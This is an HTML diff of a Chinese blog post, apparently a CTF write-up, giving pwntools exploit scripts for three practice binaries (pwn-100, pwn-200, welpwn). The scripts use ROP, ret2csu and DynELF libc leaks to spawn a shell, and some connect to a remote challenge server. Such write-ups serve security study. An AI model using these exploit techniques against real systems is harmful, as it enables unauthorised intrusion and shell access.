@@ -6,17 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://qingmu-z.github.io">
-  <title>Archives | 清霂qingmu-z</title>
+  <title>pwn libc之Dynelf | 清霂qingmu-z</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="河南大学大一新生">
-<meta property="og:type" content="website">
-<meta property="og:title" content="清霂qingmu-z">
-<meta property="og:url" content="https://qingmu-z.github.io/archives/page/3/index.html">
+  <meta name="description" content="pwn-100pwn-200welpwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn libc之Dynelf">
+<meta property="og:url" content="https://qingmu-z.github.io/2021/04/02/pwn/pwn%20libc%E4%B9%8BDynelf/index.html">
 <meta property="og:site_name" content="清霂qingmu-z">
-<meta property="og:description" content="河南大学大一新生">
+<meta property="og:description" content="pwn-100pwn-200welpwn">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-04-02T12:45:31.015Z">
+<meta property="article:modified_time" content="2021-04-02T12:50:42.327Z">
 <meta property="article:author" content="朱登榜">
-<meta property="article:tag" content="c++,二进制，leetcode,信息安全">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="ret2libc">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="清霂qingmu-z" type="application/atom+xml">
@@ -224,380 +228,271 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
           </div>
           <div id="js-content" class="content-ll">
             
-  
-  
+<article id="post-pwn/pwn libc之Dynelf" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/27/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2020-11-26T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-27</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/27/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">信安实验室 第一周 学习报告</a>
+    <h1 class="article-title" itemprop="name">
+      pwn libc之Dynelf
     </h1>
   
 
-        <div class="article-info info-on-right">
+<!--显示阅读次数-->
+
+  <br/>
+  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+  <span class="icon-sort"></span>
+  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+    阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+  </span>
+  </a>
+
+<!--显示阅读次数完毕-->
+        
+        <a href="/2021/04/02/pwn/pwn%20libc%E4%B9%8BDynelf/" class="archive-article-date">
+  	<time datetime="2021-04-02T12:45:31.015Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-02</time>
+</a>
+        <!-- 需要添加的位置 -->
+        <!-- 开始添加字数统计-->
+        
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  字数统计: </span>
+        <span class="post-count" style="color:#ef7522;font-size:14px;">928字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  阅读时长: </span>
+        <span class="post-count" style="color:#ef7522;font-size:14px;">5分</span>
+      </span>
+    </span>
+</div>
           
+        <!-- 添加完成 -->
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>pwn-100<br>pwn-200<br>welpwn</p>
+<a id="more"></a>
+<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p>
+<p>Dynelf工具可以根据泄露出的地址找到相应libc版本的其他函数地址，但缺点时不能查找字符串也就是”/bin/sh”的地址，所以找到system函数后，往往还需要找到一个可写的地方用read函数读取”/bin/sh”</p>
+<h1 id="pwn-100"><a href="#pwn-100" class="headerlink" title="pwn-100"></a>pwn-100</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">contentt = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf</span></span><br><span class="line">elf=ELF(<span class="string">&quot;pwn-100&quot;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x400550</span><span class="comment">#0x4006b8</span></span><br><span class="line">pop_rdi=<span class="number">0x400763</span></span><br><span class="line">ret_addr=<span class="number">0x4004e1</span></span><br><span class="line"></span><br><span class="line">binsh_addr=<span class="number">0x601040</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#csu</span></span><br><span class="line">pop6_addr=<span class="number">0x40075A</span></span><br><span class="line">mov3_addr=<span class="number">0x400740</span></span><br><span class="line">offset=<span class="number">0x48</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    up=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    content=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(addr)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">    payload=payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">chr</span>=io.recv(numb=<span class="number">1</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">b&#x27;\n&#x27;</span> <span class="keyword">and</span> <span class="built_in">chr</span> == <span class="string">b&quot;&quot;</span>:</span><br><span class="line">            content=content[:-<span class="number">1</span>]+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            content+=<span class="built_in">chr</span></span><br><span class="line">            up=<span class="built_in">chr</span></span><br><span class="line">    content=content[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">r12,r13,r14,r15,ret</span>):</span></span><br><span class="line">    payload =<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">    payload+=p64(pop6_addr)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload+=p64(mov3_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">56</span>)</span><br><span class="line">    payload+=p64(ret)</span><br><span class="line">    payload=payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    <span class="keyword">if</span> contentt == <span class="number">0</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./pwn-100&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">52889</span>)</span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    dynelf=DynELF(leak,elf=elf)</span><br><span class="line">    sys_addr=dynelf.lookup(<span class="string">&quot;system&quot;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">    print(sys_addr)</span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line">    csu(read_got,<span class="number">8</span>,binsh_addr,<span class="number">0</span>,main_addr)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    <span class="comment">#getshell</span></span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*offset+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)</span><br><span class="line">    payload=payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+<h1 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf</span></span><br><span class="line">elf=ELF(<span class="string">&quot;pwn-200&quot;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment">#read_got=elf.got[&#x27;read&#x27;]</span></span><br><span class="line">pop3_addr=<span class="number">0x80485cd</span></span><br><span class="line">start_addr=<span class="number">0x80483D0</span></span><br><span class="line">sub_addr=<span class="number">0x8048484</span></span><br><span class="line">binsh_addr=<span class="number">0x804a000</span></span><br><span class="line">offset=<span class="number">0x6c</span>+<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload =<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">    payload+=p32(write_plt)+p32(sub_addr)+p32(<span class="number">1</span>)+p32(addr)+p32(<span class="number">4</span>)   <span class="comment">#cs</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    s=io.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./pwn-200&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">49433</span>)</span><br><span class="line"></span><br><span class="line">    io.recv()</span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    dynelf=DynELF(leak,elf=elf)</span><br><span class="line">    sys_addr=dynelf.lookup(<span class="string">&quot;system&quot;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">    print(<span class="string">b&#x27;#&#x27;</span> * (<span class="number">10</span>))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*offset+p32(start_addr)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recv()</span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*offset+p32(read_plt)+p32(pop3_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)+p32(<span class="number">8</span>)+p32(sys_addr)+p32(sub_addr)+p32(binsh_addr)</span><br><span class="line">    <span class="comment">#+p32(sub_addr)</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    <span class="comment">#getshell p32(pop3_addr)+</span></span><br><span class="line">    <span class="comment">#payload=b&#x27;a&#x27;*offset+p32(sys_addr)+p32(sub_addr)+p32(binsh_addr)</span></span><br><span class="line">    <span class="comment">#print(sys_addr)</span></span><br><span class="line">    <span class="comment">#io.send(payload)</span></span><br><span class="line">    io.interactive()</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;welpwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">addr_pop4 = <span class="number">0x40089c</span></span><br><span class="line">addr_pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to RCTF\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span> + p64(addr_pop4) + p64(addr_pop_rdi) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(elf.symbols[<span class="string">&#x27;puts&#x27;</span>]) + p64(</span><br><span class="line">    elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\x40&#x27;</span>)</span><br><span class="line">addr_write = io.recv(<span class="number">6</span>)</span><br><span class="line">addr_write = u64(addr_write.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(addr_write))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;write&#x27;, addr_write)</span></span><br><span class="line">addr_base = addr_write - 	<span class="number">0x0eef20</span></span><br><span class="line">addr_sys = addr_base + 	<span class="number">0x048e50</span></span><br><span class="line">addr_sh = addr_base + 	<span class="number">0x18a156</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span> + p64(addr_pop4) + p64(addr_pop_rdi) + p64(addr_sh) + p64(addr_sys)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;也不知道自己写的用Dynelf哪里错了</span></span><br><span class="line"><span class="string">from pwn import *</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)</span></span><br><span class="line"><span class="string">content = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#elf</span></span><br><span class="line"><span class="string">elf=ELF(&quot;welpwn&quot;)</span></span><br><span class="line"><span class="string">write_plt=elf.plt[&#x27;write&#x27;]</span></span><br><span class="line"><span class="string">write_got=elf.got[&#x27;write&#x27;]</span></span><br><span class="line"><span class="string">read_got=elf.got[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr=0x0400630</span></span><br><span class="line"><span class="string">binsh_addr=0x601000</span></span><br><span class="line"><span class="string">pop_rdi=0x0804856d</span></span><br><span class="line"><span class="string">#csu</span></span><br><span class="line"><span class="string">offset=0x18</span></span><br><span class="line"><span class="string">pop6_addr=0x40089A</span></span><br><span class="line"><span class="string">mov3_addr=0x400880</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def csu(r12,r13,r14,r15,ret):</span></span><br><span class="line"><span class="string">    payload =b&#x27;a&#x27;*offset</span></span><br><span class="line"><span class="string">    payload+=p64(pop6_addr)+p64(0)+p64(1)</span></span><br><span class="line"><span class="string">    payload+=p64(r12)+p64(r13)+p64(r14)+p64(r15)</span></span><br><span class="line"><span class="string">    payload+=b&#x27;a&#x27;*56</span></span><br><span class="line"><span class="string">    payload+=p64(ret)</span></span><br><span class="line"><span class="string">    payload=payload.ljust(1024,b&#x27;b&#x27;)</span></span><br><span class="line"><span class="string">    io.send(payload)</span></span><br><span class="line"><span class="string">    sleep(1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def leak(addr):</span></span><br><span class="line"><span class="string">    io.recv(1024)</span></span><br><span class="line"><span class="string">    io.recvuntil(&quot;Welcome to RCTF\n&quot;)</span></span><br><span class="line"><span class="string">    csu(write_got,8,addr,1,main_addr)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    s=io.recv(8)</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def main():</span></span><br><span class="line"><span class="string">    global io</span></span><br><span class="line"><span class="string">    if content == 0:</span></span><br><span class="line"><span class="string">        io = process(&quot;./welpwn&quot;)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        io = remote(&quot;&quot;)</span></span><br><span class="line"><span class="string">    #leak</span></span><br><span class="line"><span class="string">    dynelf=DynELF(leak,elf=elf)</span></span><br><span class="line"><span class="string">    sys_addr=dynelf.lookup(&#x27;system&#x27;,&#x27;libc&#x27;)</span></span><br><span class="line"><span class="string">    print(sys_addr)</span></span><br><span class="line"><span class="string">    io.recvuntil(&quot;Welcome to RCTF\n&quot;)</span></span><br><span class="line"><span class="string">    #write</span></span><br><span class="line"><span class="string">    csu(read_got,8,binsh_addr,0,main_addr)</span></span><br><span class="line"><span class="string">    io.recvline()</span></span><br><span class="line"><span class="string">    io.send(b&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"><span class="string">    #getshell</span></span><br><span class="line"><span class="string">    io.recvuntil(&quot;Welcome to RCTF\n&quot;)</span></span><br><span class="line"><span class="string">    payload=b&#x27;a&#x27;*offset+p64(pop_rdi)+p64(binsh_addr)+p64(binsh_addr)+p64(sys_addr)</span></span><br><span class="line"><span class="string">    io.send(payload)</span></span><br><span class="line"><span class="string">    io.interactive()</span></span><br><span class="line"><span class="string">main()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>总结：能不用Dynelf，就不用。。。。老是在一些地方出错，实在查不到libc再用。</p>
+
+      
+
+
+       
+         <div class="essayending">
+           <div>
+            <div style="text-align:center;color: #ccc;font-size:22px;">
+            <br/>
+            <br/>
+ -------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------
+            <br/>
+            <br/>
+             <br/>
+             <br/>
+            </div>
+           </div>
+         </div>
+         
+
+  
+
+
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        		</li>
+      		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">学习总结</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ret2libc</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://qingmu-z.github.io/2021/04/02/pwn/pwn%20libc%E4%B9%8BDynelf/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20reverse%20%E7%AC%AC%E4%B8%80%E5%91%A8/" class="archive-article-date">
-  	<time datetime="2020-11-24T13:28:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-24</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2021/04/02/pwn/pwn%20%E5%A0%86%E5%85%A5%E9%97%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">pwn 堆入门</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20reverse%20%E7%AC%AC%E4%B8%80%E5%91%A8/">攻防世界 reverse 第一周</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">攻防世界</a>
-        		</li>
